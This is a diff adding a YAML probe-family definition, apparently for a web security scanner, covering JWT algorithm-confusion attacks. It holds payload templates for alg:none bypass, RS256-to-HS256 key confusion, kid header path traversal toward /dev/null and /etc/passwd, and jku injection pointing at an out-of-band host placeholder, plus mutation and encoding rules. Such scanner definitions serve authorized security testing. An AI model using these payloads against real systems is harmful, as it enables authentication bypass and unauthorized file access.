@@ -1,0 +1,40 @@
+family_id: jwt_none_alg
+description: >-
+  JWT algorithm confusion probes (CWE-347). alg:none bypass, RS256→HS256
+  key confusion, kid header injection, and jku/jwk header manipulation.
+cwe_ids: [347]
+owasp_top10:
+  - 'A01:2021'
+  - 'A07:2021'
+risk_level: high
+requires_approval: false
+oast_required: false
+payloads:
+  - id: alg_none
+    template: '{"alg":"none","typ":"JWT"}'
+    confidence: suspected
+    notes: JWT header with alg:none; tests acceptance of unsigned token bypass.
+  - id: alg_hs256_keyconfusion
+    template: '{"alg":"HS256","typ":"JWT"}'
+    confidence: suspected
+    notes: RS256→HS256 key confusion header; uses server public key as HMAC secret.
+  - id: kid_header_injection
+    template: '{"alg":"HS256","kid":"../../../../dev/null"}'
+    confidence: suspected
+    notes: kid header path traversal; injects predictable file path as HMAC key source.
+  - id: jwk_jku_injection
+    template: '{{"alg":"RS256","jku":"https://{oast_host}/jwks.json","kid":"{canary}"}}'
+    confidence: suspected
+    notes: jku header injection; points key server at OAST-controlled JWKS endpoint.
+mutations:
+  - name: alg_rotator
+    description: Cycle through none, None, NONE, nOnE casing variants for bypass.
+  - name: kid_traversal
+    description: Escalate kid path from ../../ to ../../../../../etc/passwd variants.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw JWT header JSON; orchestrator rebuilds token signature.
+  - name: base64_url
+    stages: [base64_url]
+    description: URL-safe base64-encoded JWT header segment.
